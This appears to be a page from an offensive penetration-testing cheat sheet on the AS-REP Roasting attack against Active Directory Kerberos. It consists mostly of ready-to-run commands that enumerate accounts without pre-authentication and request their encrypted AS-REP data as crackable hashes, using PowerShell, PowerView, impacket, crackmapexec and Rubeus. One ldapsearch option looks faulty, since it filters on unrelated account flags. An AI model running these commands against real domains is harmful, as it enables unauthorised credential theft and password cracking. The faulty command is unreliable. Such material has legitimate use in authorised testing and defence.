# AS-REP Roasting Attack

## AS-REP Roasting Attack [t-ad-kerberos-as_rep_roasting]

If "Do not require pre-authentication" flag is set to the account it makes it vulnerable for 
AS-REP Roasting attack.

In this attack, an attacker can send an authentication request (AS-REQ) to the KDC 
on behalf of the user without providing an authenticator (encrypted timestampt). 
The KDC will respond with an AS-REP message that includes a part, which is encrypted using the 
user`s kerberos key (derived from user`s password or hash).

The attacker can attempt to crack the encrypted part offline by guessing the user`s password.



{% hint style="info" %}It worth checking if the DCs are vulnerable to RC4 AS-REP Decryption  (CVE-2022-33647, CVE-2022-33679) vulnerability. 

{% endhint %}
### 1.1 Enumerate users with "Do not require pre-authentication" flag




**option 1: powershell_ad_module**

{% code overflow="wrap" %}
```bash
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
```
{% endcode %}


**option 2: powershell**

{% code overflow="wrap" %}
```bash
$root = [ADSI]"LDAP://dc=domain,dc=com"
$search = new-Object System.DirectoryServices.DirectorySearcher($root)
$search.Filter ="(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$search.FindAll()

```
{% endcode %}


**option 3: powerview**

{% code overflow="wrap" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose

```
{% endcode %}


**option 4: ldapsearch**

{% code overflow="wrap" %}
```bash
ldapsearch -x ldap://<dc_ip> -D "<user@domain.com>" -w '<password>' -b "DC=<domain,DC=com>" -b "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName userPrincipalName memberOf
```
{% endcode %}

### 1.2 Request tickets




**option 1: impacket**

{% code overflow="wrap" %}
```bash
#unauthenticated
impacket-GetNPUsers domain.com/ -no-pass -usersfile ad_users.txt -outputfile hashes.asreproast

#authenticated
impacket-GetNPUsers domain.com/user:'P@ssw0rd' -request -format hashcat -outputfile hashes.asreproast

```
{% endcode %}

{% hint style="info" %}it might be useful to ask just for specific users using "-usersfile usernames.txt" parameter instead of providing creds:
impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile hashes.asreproast domain.com/


{% endhint %}


**option 2: crackmapexec**

{% code overflow="wrap" %}
```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
```
{% endcode %}


**option 3: rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
```
{% endcode %}

